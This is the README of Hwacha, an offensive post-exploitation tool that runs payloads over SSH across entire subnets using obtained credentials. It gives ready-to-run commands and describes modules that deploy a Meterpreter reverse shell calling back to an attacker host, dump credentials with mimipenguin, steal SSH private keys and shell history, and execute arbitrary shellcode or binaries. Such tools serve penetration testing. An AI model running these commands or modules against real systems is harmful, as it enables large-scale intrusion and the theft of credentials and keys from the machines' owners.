# Hwacha
![alt tag](https://github.com/n00py/hwacha/blob/master/hwacha.png)

https://www.n00py.io/2017/12/raining-shells-on-linux-environments-with-hwacha/

Hwacha is a tool to quickly execute payloads on *Nix based systems.  Easily collect artifacts or execute shellcode on an entire subnet of systems for which credentials are obtained. 


    $python hwacha.py 
        &&&&     &&         &&        &&
    &&&&&&&&&&&& &&         &&        &&      Created by Esteban Rodriguez   /~~\_
       &&&&&&    &&     &&&&&&&&&&    &&	  Web: https://www.n00py.io     /| '` *\
      &&    &&   &&&&&      &&        &&&&&        Twitter: @n00py1         \|  ___/
     &&      &&  &&&&&    &&  &&      &&&&&   _   _                     _
      &&    &&   &&      &&    &&     &&     | | | |                   | |
       &&&&&&    &&    &&&      &&&   &&     | |_| |__      ____ _  ___| |__   __ _
         &&      &&   &&          &&  &&     |  _  |\ \ /\ / / _` |/ __| '_ \ / _` |
    &&&&&&&&&&&&&&&                   &&     | | | | \ V  V / (_| | (__| | | | (_| |
                 &&                   &&     \_| |_/  \_/\_/ \__,_|\___|_| |_|\__,_| 
    To run commands, use -x [COMMAND]
    to run modules, use -m [MODULE]
    to specify module options, use -o [ARG=ARG ARG=ARG]
    to see all available modules, use -L
    Example usage:
    python hwacha.py -t 192.168.1.1/24 -u admin  -p password
    python hwacha.py -t 192.168.1.100-200 -u admin  -p password -m keys
    python hwacha.py -t 192.168.1.100-200 -u admin  -i loot/keys/192.168.1.101/id_rsa -x id
    python hwacha.py -t 192.168.1.123 -u admin  -p password -m meterpreter -o "LPORT=4444 LHOST=192.168.1.150 TYPE=64"


    Available Modules:
    [*] meterpreter               Use this to execute a meterpreter agent on the target(s).
                                  REQURED ARGUMENTS: LHOST , LPORT
                                  OPTIONAL ARGUMENTS: TYPE {python, php, 32, 64, osx}
    [*] mimipenguin               Use this to execute a mimipenguin on the target(s) to recover credentials.  (Requires root)
                                  OPTIONAL ARGUMENTS: LHOST, LPORT
    [*] keys                      Use this to collect SSH private keys from the target(s).
    [*] history                   Use this to collect shell history files from the target(s).
    [*] privs                     Use this to enumerate sudo privileges on the targets(s).
    [*] web_delivery               Use this to execute a python script on the target(s).
                                  REQURED ARGUMENTS: PATH
                                  OPTIONAL ARGUMENTS: LISTEN
    [*] custom_bin               Use this to execute a custom binary on the target(s).
                                  REQURED ARGUMENTS: PATH
    [*] sudo_exec               Use this to execute a custom binary (with sudo) on the target(s).
                                  REQURED ARGUMENTS: PATH
    [*] shellcode               Use this to execute custom shellcode on the target(s).
                                  REQURED ARGUMENTS: PATH
